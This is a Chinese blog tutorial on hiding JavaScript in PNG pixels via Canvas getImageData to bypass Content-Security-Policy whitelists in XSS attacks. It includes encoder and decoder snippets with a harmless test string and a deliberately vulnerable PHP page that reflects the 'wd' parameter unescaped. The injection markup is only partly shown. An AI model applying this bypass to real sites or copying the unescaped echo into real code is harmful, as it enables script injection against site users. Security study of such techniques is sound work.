<!doctype html><html class=no-js lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>利用Png做持久型XSS攻击 - 臭大佬博客</title><script>(function(e,t){e[t]=e[t].replace("no-js","js")})(document.documentElement,"className")</script><meta name=description content="利用Png做持久型XSS攻击"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=dns-prefetch href=//fonts.googleapis.com><link rel=dns-prefetch href=//fonts.gstatic.com><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700"><link rel=stylesheet href=/choudalao.github.io/css/style.css><link rel=stylesheet href=/choudalao.github.io/css/custom.css><link rel="shortcut icon" href=/choudalao.github.io/favicon.ico></head><body class=body><div class="container container--outer"><header class=header><div class="container header__container"><div class=logo><a class=logo__link href=/choudalao.github.io/ title=臭大佬博客 rel=home><div class="logo__item logo__text"><div class=logo__title>臭大佬博客</div></div></a></div><nav class=menu><button class=menu__btn aria-haspopup=true aria-expanded=false tabindex=0>
<span class=menu__btn-title tabindex=-1>菜单</span></button><ul class=menu__list><li class=menu__item><a class=menu__link href=/choudalao.github.io/><span class=menu__text>首页</span></a></li><li class=menu__item><a class=menu__link href=/choudalao.github.io/categories/><span class=menu__text>分类</span></a></li><li class=menu__item><a class=menu__link href=/choudalao.github.io/tags/><span class=menu__text>标签</span></a></li><li class=menu__item><a class=menu__link href=/choudalao.github.io/posts/><span class=menu__text>归档</span></a></li><li class=menu__item><a class=menu__link href=/choudalao.github.io/about/><span class=menu__text>关于</span></a></li></ul></nav></div></header><div class="wrapper flex"><div class=primary><main class=main role=main><article class=post><header class=post__header><h1 class=post__title>利用Png做持久型XSS攻击</h1></header><div class="content post__content clearfix"><h1 id=原理>原理</h1><p>使用<code>HTML Canvas</code>可以将任何<code>JavaScript</code>代码或整个库隐藏到一个<code>PNG</code>图片中，方法是将每个源代码字符转换为一个像素。然后，可以将图片上传到受信任的网站（如腾讯阿里系网站）（通常由<code>CSP</code>列入白名单）最后将其作为远程图片加载到<code>HTML</code>文档中。最后，通过使用<code>canvas getImageData</code>方法，可以从图片中提取“隐藏的<code>JavaScript</code>并执行它。有时这可能会导致绕过内容安全策略，使攻击者能够获取整个外部<code>JavaScript</code>库。</p><p><code>canvas</code>元素标签强大之处在于可以直接在<code>HTML</code>上进行图形操作，具有极大的应用价值。<code>canvas</code> 可以实现对图像的像素操作，这就要说到 <code>getImageData()</code> 方法了。 <code>ImageData</code> 对象用来描述 <code>canvas</code> 区域隐含的像素数据，奇热这个区域通过矩形表示，起始点为<code>(sx, sy)</code>、宽为<code>sw</code>、高为<code>sh</code>。</p><h4 id=canvas-getimagedata-方法的定义和用法>canvas getImageData() 方法的定义和用法</h4><p><code>getImageData()</code> 方法返回 <code>ImageData</code> 对象，该对象拷贝了画布指定矩形的像素数据。</p><p>对于 <code>ImageData</code> 对象中的每个像素，都存在着四方面的信息，即 RGBA 值：</p><p>R - 红色 (0-255)；</p><p>G - 绿色 (0-255)；</p><p>B - 蓝色 (0-255)；</p><p>A - alpha 通道 (0-255; 0 是透明的，255 是完全可见的)；</p><p><code>color/alpha</code> 以数组形式存在，并存储于 <code>ImageData</code> 对象的 <code>data</code> 属性中。</p><p>注意在操作完成数组中的 <code>color/alpha</code> 信息之后，你可以使用 <code>putImageData()</code> 方法将图像数据复制到画布上。</p><p>由于<code>Content-Security-Policy</code>响应头在防止<code>XSS</code>、<code>clickjacking</code>和其他代码注入攻击方面的效率，它被越来越多地使用。然而，许多网站配置<code>laxy</code>策略来避免误报和白名单整个域，而不是特定的资源，或使用不安全的内联或不安全的<code>eval</code>指令，这可能导致策略绕过。</p><p><code>canvas</code> 的相关知识可以查看 <a href=https://www.runoob.com/w3cnote/html5-canvas-intro.html title="学习 HTML5 Canvas 这一篇文章就够了">学习 HTML5 Canvas 这一篇文章就够了</a></p><p>如果有条件的话，可以阅读<a href=https://hackernoon.com/host-a-web-app-on-twitter-in-a-single-tweet-9aed28bdb350 title="Mike Parsons的一篇文章">Mike Parsons的一篇文章</a>，他在这篇文章中详细展示了如何使用<code>HTML Canvas</code>将<code>JavaScript</code>代码“存储”到一个<code>PNG</code>图片中。</p><p><code>Canvas 2D API</code>的<code>CanvasRenderingContext2D.putImageData（）</code>方法将给定<code>ImageData</code>对象中的数据绘制到画布上。如果提供了脏矩形<code>（dirty rectangle ）</code>，则仅绘制该矩形中的像素，此方法不受画布转换矩阵的影响。</p><p><code>Canvas 2D API</code>的<code>CanvasRenderingContext2D</code>方法<code>getImageData（）</code>返回一个<code>ImageData</code>对象，该对象表示画布的指定部分的基础像素数据。此方法不受画布转换矩阵的影响，如果指定的矩形延伸到画布的边界之外，则画布外的像素在返回的<code>ImageData</code>对象中为透明的黑色。</p><h1 id=原理演示>原理演示</h1><h3 id=生成png图片>生成png图片</h3><p>打开谷歌浏览器，在搜索栏输入 <code>about:blank</code>,回车跳转，然后打开<code>JavaScript</code>控制台。粘贴以下代码到控制台后回车。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// 如何将文本字符串“存储”到图片中
</span></span></span><span style=display:flex><span>(<span style=color:#66d9ef>function</span> () {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>encode</span>(<span style=color:#a6e22e>a</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>a</span><span style=color:#f92672>.</span><span style=color:#a6e22e>length</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>c</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>a</span><span style=color:#f92672>.</span><span style=color:#a6e22e>length</span>,
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>e</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Math</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ceil</span>(<span style=color:#a6e22e>Math</span><span style=color:#f92672>.</span><span style=color:#a6e22e>sqrt</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>/</span> <span style=color:#ae81ff>3</span>)),
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>f</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>e</span>,
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>g</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>document</span><span style=color:#f92672>.</span><span style=color:#a6e22e>createElement</span>(<span style=color:#e6db74>&#34;canvas&#34;</span>),
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>h</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>g</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getContext</span>(<span style=color:#e6db74>&#34;2d&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>g</span><span style=color:#f92672>.</span><span style=color:#a6e22e>width</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>e</span>, <span style=color:#a6e22e>g</span><span style=color:#f92672>.</span><span style=color:#a6e22e>height</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>f</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>j</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>h</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getImageData</span>(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>e</span>, <span style=color:#a6e22e>f</span>),
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>k</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>j</span><span style=color:#f92672>.</span><span style=color:#a6e22e>data</span>,
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>l</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>m</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>m</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>f</span>; <span style=color:#a6e22e>m</span><span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>n</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>n</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>e</span>; <span style=color:#a6e22e>n</span><span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>o</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> (<span style=color:#a6e22e>m</span> <span style=color:#f92672>*</span> <span style=color:#a6e22e>e</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> <span style=color:#a6e22e>n</span>,
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>a</span>[<span style=color:#a6e22e>l</span><span style=color:#f92672>++</span>],
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>q</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>a</span>[<span style=color:#a6e22e>l</span><span style=color:#f92672>++</span>],
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>r</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>a</span>[<span style=color:#a6e22e>l</span><span style=color:#f92672>++</span>];
</span></span><span style=display:flex><span>                    (<span style=color:#a6e22e>p</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>q</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>r</span>) <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>p</span> <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>k</span>[<span style=color:#a6e22e>o</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>p</span>)), <span style=color:#a6e22e>q</span> <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>k</span>[<span style=color:#a6e22e>o</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>q</span>)), <span style=color:#a6e22e>r</span> <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>k</span>[<span style=color:#a6e22e>o</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>r</span>)), <span style=color:#a6e22e>k</span>[<span style=color:#a6e22e>o</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>255</span>)
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>h</span><span style=color:#f92672>.</span><span style=color:#a6e22e>putImageData</span>(<span style=color:#a6e22e>j</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>), <span style=color:#a6e22e>h</span><span style=color:#f92672>.</span><span style=color:#a6e22e>canvas</span><span style=color:#f92672>.</span><span style=color:#a6e22e>toDataURL</span>()
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>ord</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>a</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>c</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>e</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>charCodeAt</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>55296</span> <span style=color:#f92672>&lt;=</span> <span style=color:#a6e22e>e</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#ae81ff>56319</span> <span style=color:#f92672>&gt;=</span> <span style=color:#a6e22e>e</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>1</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>length</span>) <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>e</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>f</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>charCodeAt</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1024</span> <span style=color:#f92672>*</span> (<span style=color:#a6e22e>e</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>55296</span>) <span style=color:#f92672>+</span> (<span style=color:#a6e22e>f</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>56320</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>65536</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>56320</span> <span style=color:#f92672>&lt;=</span> <span style=color:#a6e22e>e</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#ae81ff>57343</span> <span style=color:#f92672>&gt;=</span> <span style=color:#a6e22e>e</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>e</span> <span style=color:#f92672>:</span> <span style=color:#a6e22e>e</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>d</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>document</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>b</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>d</span><span style=color:#f92672>.</span><span style=color:#a6e22e>body</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>img</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Image</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>stringenc</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Hello, World!&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>img</span><span style=color:#f92672>.</span><span style=color:#a6e22e>src</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>encode</span>(<span style=color:#a6e22e>stringenc</span>), <span style=color:#a6e22e>b</span><span style=color:#f92672>.</span><span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>b</span><span style=color:#f92672>.</span><span style=color:#a6e22e>appendChild</span>(<span style=color:#a6e22e>img</span>)
</span></span><span style=display:flex><span>})();
</span></span></code></pre></div><p>效果如下：
<img src=https://www.choudalao.com/uploads/20210929/2021092923164234SCqC.png alt></p><p>上面的代码使用<code>putImageData</code>方法创建一个图片，该方法将“Hello, World!”字符串的每组3个字符表示为每个像素的RGB级别(红色、绿色和蓝色)。在浏览器的控制台中运行后，你会在左上角看到一个小图片。</p><p>我们右键小图片，可以另存为本地作为恶意攻击图片。</p><p><img src=https://www.choudalao.com/uploads/20210930/20210930000406F9w2so.png alt></p><p>上图的每个像素代表“隐藏字符串”的<code>3</code>个字符。使用<code>charCodeAt</code>函数，我可以将每个字符转换为<code>0</code>到<code>65535</code>之间的整数，代表其<code>UTF-16</code>代码单元。在单个像素中，第一个转换的字符用于红色通道，第二个字符用于绿色通道，最后一个字符用于蓝色通道。第四个值是在我们的示例中始终为<code>255</code>的<code>alpha</code>级别。如下所示：</p><p>r = &ldquo;H&rdquo;.charCodeAt(0)
g = &ldquo;e&rdquo;.charCodeAt(0)
b = &ldquo;l&rdquo;.charCodeAt(0)
a = 255
j.data = [r,g,b,a,&mldr;]
在以下架构中，我尝试更好地解释如何将字符串的字符分配到ImageData数组中：</p><p><img src=https://www.choudalao.com/uploads/20210929/20210929232210TCMm8t.png alt></p><h3 id=png-图片还原内容>png 图片还原内容</h3><p>现在我们有了一个表示“Hello, World!”字符串的PNG图片。复制以下代码，粘贴在刚才的<code>js</code>控制台上，并回车运行，以将生成的PNG图片转换为原始文本字符串：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// 如何将该图片转换回其原始字符串
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>t</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>document</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getElementsByTagName</span>(<span style=color:#e6db74>&#34;img&#34;</span>)[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>s</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>String</span><span style=color:#f92672>.</span><span style=color:#a6e22e>fromCharCode</span>, <span style=color:#a6e22e>c</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>document</span><span style=color:#f92672>.</span><span style=color:#a6e22e>createElement</span>(<span style=color:#e6db74>&#34;canvas&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>cs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>style</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>cx</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getContext</span>(<span style=color:#e6db74>&#34;2d&#34;</span>),
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>w</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>.</span><span style=color:#a6e22e>offsetWidth</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>h</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>.</span><span style=color:#a6e22e>offsetHeight</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>width</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>w</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>height</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>h</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>cs</span><span style=color:#f92672>.</span><span style=color:#a6e22e>width</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>w</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;px&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>cs</span><span style=color:#f92672>.</span><span style=color:#a6e22e>height</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>h</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;px&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>cx</span><span style=color:#f92672>.</span><span style=color:#a6e22e>drawImage</span>(<span style=color:#a6e22e>t</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>x</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>cx</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getImageData</span>(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>w</span>, <span style=color:#a6e22e>h</span>)<span style=color:#f92672>.</span><span style=color:#a6e22e>data</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>l</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span><span style=color:#f92672>.</span><span style=color:#a6e22e>length</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>l</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>4</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0</span>]) <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>s</span>(<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]) <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>s</span>(<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>]) <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>s</span>(<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>]);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span><span style=color:#f92672>.</span><span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>a</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>document</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getElementsByTagName</span>(<span style=color:#e6db74>&#34;body&#34;</span>)[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span><span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>a</span>;
</span></span></code></pre></div><p><img src=https://www.choudalao.com/uploads/20210929/20210929232438jGcap3.png alt></p><p><code>JavaScript</code>代码选择刚刚创建的图片元素，并使用<code>getImageData</code>将其转换为原始文本字符串。使用<code>getImageData</code>时，会发生这样的情况：你将获得一个<code>ImageData</code>对象，该对象的<code>data</code>属性包含一个大数组。如前所示，<code>ImageData</code>数组中每个像素都有四个元素：<code>r</code>、<code>g</code>、<code>b</code>和<code>alpha</code>。因此，该数组看起来像[<code>pixel1R</code>，<code>pixel1G</code>，<code>pixel1B</code>，<code>pixel1Alpha</code>，&mldr;，<code>pixelNR</code>，<code>pixelNG</code>，<code>pixelNB</code>，<code>pixelNAlpha</code>]。</p><h1 id=理论依据>理论依据</h1><p>现在我们知道了如何将文本字符串“存储”到图片中，以及如何将该图片转换回其原始字符串。现在假设隐藏<code>JavaScript</code>代码而不是简单的文本字符串，然后将生成的PNG图片上传到大型网站中。可以绕过内容安全性策略，即绕过大型网站的白名单图片，并可以利用<code>XSS</code>从“受信任的”来源加载<code>JavaScript</code>内容。</p><h1 id=实现>实现</h1><h3 id=部署测试网站>部署测试网站</h3><p>假设某网站有个搜索框，代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// http://dev.host.net/png.php
</span></span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; img-src &#39;self&#39; http://dev.pikachu.net&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;html&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;input id=&#34;kw&#34; name=&#34;wd&#34; class=&#34;s_ipt&#34; value=&#34;&lt;?php echo $_GET[&#34;wd&#34;] ?&gt;&#34; maxlength=&#34;255&#34; autocomplete=&#34;off&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/body&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/html&gt;
</span></span></span></code></pre></div><p>该应用程序使用了一个<code>Content-Security-Policy</code>，该策略允许来自“self”和<code>http://dev.pikachu.net</code>（本地址是我本地搭建的，用于代替大型网站）的图片，并允许来自“self”、“inline”和“eval”的<code>JavaScript</code>。不幸的是，有许多网站配置了<code>script-src</code>指令，允许<code>unsafe-inline</code>和<code>unsafe-eval</code>来避免误报。而且，许多网站将整个域列入白名单，而不是将特定资源列入白名单。</p><p>该漏洞位于<code>wd querystring</code>参数上，该参数不能清除导致<code>HTML</code>注入和<code>Reflected XSS</code>的用户输入。要利用此测试<code>Web</code>应用程序上的<code>XSS</code>漏洞，我需要注入<code>HTML</code>语法以关闭<code>src</code>属性并添加<code>SCRIPT</code>标签，然后注入<code>JavaScript</code>代码。</p><p>我们可以假设构造参数模拟攻击，然后根据构造的结果去推测参数形式，根据<code> http://dev.host.net/png.php</code>的现有代码，我们构造如下代码。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>body</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>input</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;kw&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wd&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;s_ipt&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1&#34;</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;xxx&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;jsimg&#34;</span> <span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span> <span style=color:#a6e22e>maxlength</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;255&#34;</span> <span style=color:#a6e22e>autocomplete</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;off&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>body</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;</span>
